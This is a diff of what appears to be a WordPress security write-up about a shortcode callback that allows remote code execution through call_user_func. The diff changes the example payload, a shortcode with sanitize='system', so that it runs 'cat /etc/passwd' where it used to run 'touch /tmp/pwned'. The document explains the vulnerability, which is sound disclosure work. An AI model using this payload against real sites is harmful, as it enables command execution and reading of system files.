@@ -56,7 +56,7 @@ function image_render_callback($atts) {
     if ( ! empty( $chosen_callback ) && is_callable( $chosen_callback ) ) {
         $text = call_user_func( $chosen_callback, $atts["text"] );
     }
-    
+
     return sprintf("<img src='%s'>%s</img>", esc_attr($atts["src"]), $text);
 
 }
@@ -67,7 +67,7 @@ add_shortcode("imagerender", "image_render_callback");
 To exploit this, the Contributor+ role user simply needs to create a drafted post with the below content to trigger RCE via `call_user_func` function:
 
 ```json
-[imagerender src="https://patchstack.com" sanitize="system" text="touch /tmp/pwned"]
+[imagerender src="https://patchstack.com" sanitize="system" text="cat /etc/passwd"]
 ```
 
 Below are some of the findings related to RCE:
